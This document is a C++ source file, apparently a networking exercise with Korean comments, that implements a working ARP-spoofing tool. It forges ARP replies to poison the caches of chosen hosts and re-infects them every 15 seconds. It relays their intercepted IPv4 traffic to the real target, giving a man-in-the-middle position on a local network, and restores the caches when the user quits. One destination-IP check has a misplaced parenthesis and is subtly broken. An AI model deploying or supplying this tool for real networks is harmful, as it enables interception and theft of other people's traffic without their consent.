#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <libnet.h>
#include <thread>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct EthIpPacket final{
    EthHdr eth_;
    libnet_ipv4_hdr ip_;
};

typedef struct MacIp {
    Mac mac_;
    Ip ip_;
} MacIp;

typedef struct Flow {
    MacIp sender;
    MacIp target;
} Flow;

#pragma pack(pop)

MacIp attacker;        // 전역 변수 attacker
bool stop = false;     // while문 종료 변수

enum type{
    none,
    request,
    infect,
    relay,
    recover
};

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_attacker(char* dev){
    struct ifreq ifr;
    memset(&ifr, 0x00, sizeof(ifr));
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        fprintf(stderr, "fail to socket\n");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    int ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret < 0){
        fprintf(stderr, "Fail to get MAC address\n");
        close(sockfd);
        exit(-1);
    }

    uint8_t tmpMAC[sizeof(Mac)];
    memcpy(tmpMAC, ifr.ifr_hwaddr.sa_data, sizeof(Mac));
    attacker.mac_ = Mac(tmpMAC);

    // IP
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if(ret < 0){
        fprintf(stderr, "Fail to get IP address\n");
        close(sockfd);
        exit(-1);
    }
    attacker.ip_ = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    close(sockfd);
}

void send_EthArpPacket(pcap_t* handle, EthArpPacket packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return;
}

void get_Mac_from_EthArpPacket(pcap_t* handle, MacIp* object){
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct EthHdr* eth_header = (struct EthHdr*) packet;
        if(eth_header -> type() != EthHdr::Arp)
            continue;
        struct ArpHdr* arp_header = (struct ArpHdr*) &packet[sizeof(struct EthHdr)];
        if(arp_header->op() == ArpHdr::Reply && object -> ip_ == arp_header -> sip()){ //sip()=ntohl(ip_)
            object -> mac_ = arp_header -> smac_;
            return;
        }
    }
}

EthArpPacket make_EthArpPacket(MacIp* s, MacIp* t, enum type op){
    EthArpPacket packet;

    packet.eth_.dmac_ = t -> mac_;
    packet.eth_.smac_ = s -> mac_;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.smac_ = s -> mac_;
    packet.arp_.sip_ = htonl(s -> ip_);
    packet.arp_.tmac_ = t -> mac_;
    packet.arp_.tip_ = htonl(t -> ip_);

    if(op == request)
    {
        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if(op == infect || op == recover)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    else{
        fprintf(stderr, "Fail to make EthArp packet\n");
        exit(-1);
    }
    return packet;
}

void get_Mac(pcap_t* handle, MacIp* object){
    enum type op = request;
    object -> mac_ = Mac("00:00:00:00:00:00");
    EthArpPacket req_packet = make_EthArpPacket(&attacker, object, op);
    send_EthArpPacket(handle, req_packet);
    get_Mac_from_EthArpPacket(handle, object);
    return;
}

void arp_infect(pcap_t* handle, Flow* flow){
    enum type op = infect;
    MacIp fake;
    fake.mac_ = attacker.mac_;
    fake.ip_ = flow->target.ip_;
    EthArpPacket infect_packet = make_EthArpPacket(&fake, &(flow->sender), op);
    send_EthArpPacket(handle, infect_packet);
    return;
}

void arp_relay(pcap_t* handle, Flow* flow, const u_char* packet){
    EthIpPacket* buf = (EthIpPacket*) packet;
    buf->eth_.smac_ = attacker.mac_;
    buf->eth_.dmac_ = flow->target.mac_;

    int res = pcap_sendpacket(handle,  reinterpret_cast<const u_char*>(buf), sizeof(EthHdr)+(ntohs(buf->ip_.ip_len)));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return;
}

void arp_recover(pcap_t* handle, Flow* flows, int n){
    enum type op = recover;
    for(int i=0;i<n;i++){
        EthArpPacket recover_packet = make_EthArpPacket(&(flows[i].target), &(flows[i].sender), op);
        send_EthArpPacket(handle, recover_packet);
    }
    return;
}

int is_flows_num(Ip sip, Ip tip, Flow* flows, int n){
    for(int i=0;i<n;i++){
        if(flows[i].sender.ip_ == sip){
            if(flows[i].target.ip_ == tip)
                return i;
        }
    }
    return -1;
}

void continuous_infect(pcap_t* handle, Flow* flows, int n){
    while(!stop){
        sleep(15);
        for(int i=0;i<n;i++){
            arp_infect(handle, &flows[i]);
        }
    }
}

void set_stop(){
    char ch;
    while(!stop){
        ch = getchar();
        if (ch == 'q')
            stop = true;
    }
}


int main(int argc, char* argv[]) {
    if (argc < 4 || (argc%2) != 0) {   // not exist sender-target flow pair
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    get_attacker(dev);

    int n = (argc-2)/2; //flow 개수
    Flow* flows = (Flow*)malloc(sizeof(Flow)*n);
    int idx=0;            // flows index

    // 모든 flow 감염
    for(int i=2;i<argc;i=i+2){
        flows[idx].sender.ip_ = Ip(argv[i]);
        flows[idx].target.ip_ = Ip(argv[i+1]);
        get_Mac(handle, &(flows[idx].sender));
        get_Mac(handle, &(flows[idx].target));
        arp_infect(handle, &flows[idx++]);
    }

    // 감염 이후
    std::thread t1(continuous_infect, handle, flows, n);        // 지속적인 감염
    std::thread t2(set_stop);                                    // 작업 중지 리스너(q 입력 시 end)

    while(!stop){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthHdr* eth_header = (struct EthHdr*) packet;

        if(eth_header -> type() == EthHdr::Arp){
            struct ArpHdr* arp_header = (struct ArpHdr*) &packet[sizeof(struct EthHdr)];
            int idx = -1;
            if(eth_header->dmac_.isBroadcast()){
                idx = is_flows_num(arp_header->tip(), arp_header -> sip(), flows, n);   // target가 sender MAC을 위해 broadcast ARP
            }
            else{
                idx = is_flows_num(arp_header -> sip(), arp_header->tip(), flows, n);   // sender가 target MAC을 위해 ARP
            }
            if(idx >=0 && idx < n)      // sip, tip in flows
                arp_infect(handle, &flows[idx]);
            else
                continue;
        }
        else if(eth_header -> type() == EthHdr::Ip4){
            struct libnet_ipv4_hdr* ip_header = (struct libnet_ipv4_hdr*) &packet[sizeof(struct EthHdr)];
            if(eth_header->dmac_ == attacker.mac_ && Ip(ntohl(ip_header->ip_dst.s_addr) != attacker.ip_)){      // dmac은 attacker but dip는 attacker x => spoof
                for(int i=0;i<n;i++){
                    if(flows[i].sender.mac_ == eth_header->smac_){
                        arp_relay(handle, &flows[i], packet);
                        break;
                    }
                }
            }
        }
    }

    t1.join();
    t2.join();

    // recover
    arp_recover(handle, flows, n);
    free(flows);
    pcap_close(handle);
}
